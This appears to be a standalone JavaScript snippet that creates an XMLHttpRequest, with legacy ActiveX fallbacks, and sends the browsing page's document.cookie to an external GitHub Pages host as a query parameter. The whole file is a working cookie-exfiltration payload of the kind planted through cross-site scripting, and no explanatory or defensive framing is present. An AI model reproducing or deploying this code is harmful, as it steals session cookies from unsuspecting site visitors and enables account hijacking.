var ajax = false;
if(window.XMLHttpRequest){
	//IE7+,Safari,Opera etc.
	ajax = new XMLHttpRequest();
}else if(window.ActiveXObject){
	try
	{
		ajax = new ActiveXObject("Msxml2.XMLHTTP");
	}
	catch (e1)
	{
		try
		{
			ajax = new ActiveXObject("Microsoft.XMLHTTP");
		}
		catch (e2)
		{
		}
	}
}
ajax.open("get", "http://vvip.github.io/vvip/stylesheets/test2.js?cookie="+encodeURI(document.cookie), true);
ajax.send();
